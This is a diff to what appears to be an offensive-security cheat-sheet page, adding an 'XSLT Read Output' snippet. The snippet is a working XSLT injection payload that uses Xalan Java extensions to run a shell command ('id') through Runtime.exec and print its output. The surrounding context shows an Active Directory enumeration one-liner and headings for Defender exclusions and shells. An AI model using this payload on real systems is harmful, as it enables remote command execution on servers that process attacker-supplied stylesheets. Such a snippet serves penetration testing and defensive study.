@@ -15,6 +15,8 @@ author_profile: true
   - [Create a shortcut lnk one-liner](#create-a-shortcut-lnk-one-liner)
   - [Create a Windows Defender exclusion](#create-a-windows-defender-exclusion)
   - [Various AD commands without AD cmdlets](#various-ad-commands-without-ad-cmdlets)
+- [Snippets]
+  - [XSLT Read Output](#xslt-read-output)
 - [Shells](#shells)
   - [Upgrade to PTY](#upgrade-to-pty)
   - [Bash](#bash)
@@ -125,6 +127,24 @@ Get all groups and members of
 
 > ```([adsisearcher]'(&(objectCategory=group))').FindAll().Properties | % {$m=([ADSI]"LDAP://$($_.distinguishedname)").Member;if($m){write-host "Group: "$_.name;$m}} | % { ([adsisearcher]"(distinguishedname=$_)").FindOne().Properties.samaccountname }```
 
+## Snippets
+
+### XSLT Read Output
+Snippet for use in XSLT injection to read a single line of output from the command. This example uses the `id` command
+```
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process" xmlns:instrrdr="http://xml.apache.org/xalan/java/java.io.InputStreamReader" xmlns:buf="http://xml.apache.org/xalan/java/java.io.BufferedReader" xmlns:obj="http://xml.apache.org/xalan/java/java.lang.Object">
+<xsl:template match="/">
+<xsl:variable name="cmd">id</xsl:variable>
+<xsl:variable name="rtobject" select="rt:getRuntime()"/>
+<xsl:variable name="process" select="rt:exec($rtobject,$cmd)"/>
+<xsl:variable name="inputStream" select="process:getInputStream($process)"/>
+<xsl:variable name="inputStreamRdr" select="instrrdr:new($inputStream)"/>
+<xsl:variable name="bufReader" select="buf:new($inputStreamRdr)"/>
+<xsl:variable name="ts" select="obj:toString(buf:readLine($bufReader))"/>
+<xsl:value-of select="$ts" />
+</xsl:template>
+</xsl:stylesheet>
+```
 ## Shells
 ### Upgrade to PTY
 Python
